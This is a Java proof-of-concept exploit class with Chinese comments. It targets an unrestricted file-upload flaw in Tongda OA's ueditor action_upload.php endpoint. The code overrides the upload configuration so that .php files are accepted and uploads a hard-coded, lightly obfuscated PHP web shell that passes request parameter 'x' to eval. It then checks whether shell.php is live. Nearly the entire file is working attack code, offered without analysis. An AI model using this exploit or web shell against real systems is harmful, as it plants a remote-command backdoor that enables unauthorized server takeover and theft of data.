package poc;

import com.github.kevinsawicki.http.HttpRequest;

public class TongdaOA_ActionUpload {
    private String url;//通达OAurl地址
    private String path;//网站目录
    private String fileName;//上传文件名
    private String fileContent="<?php class Gz5SfY10 { public function __construct($H7Es8){ @eval(\"/*Z7y11Eib8N*/\".$H7Es8.\"\"); }}new Gz5SfY10($_REQUEST['x']);?>";//上传文件内容

    //Getter、Setter方法

    public String getUrl() {
        return url;
    }

    public void setUrl(String url) {
        this.url = url;
    }

    public String getPath() {
        return path;
    }

    public void setPath(String path) {
        this.path = path;
    }

    public String getFileName() {
        return fileName;
    }

    public void setFileName(String fileName) {
        this.fileName = fileName;
    }

    public String getFileContent() {
        return fileContent;
    }

    public void setFileContent(String fileContent) {
        this.fileContent = fileContent;
    }

    public boolean POC(){
        path = "/module/ueditor/php/action_upload.php?action=uploadfile";
        HttpRequest part = HttpRequest.post(url + path)
                .trustAllCerts()
                .trustAllHosts()
                .part("CONFIG[fileFieldName]", "filename")
                .part("CONFIG[fileMaxSize]", 10000)
                .part("CONFIG[filePathFormat]", "shell")
                .part("CONFIG[fileAllowFiles][]", ".php")
                .part("mufile", "submit")
                .part("filename", "shell.php",fileContent);
        part.body();
        path = "/"+"shell.php";
        if (HttpRequest.get(url+path).code()==200){
            return true;
        }else {
            return false;
        }
    }
}
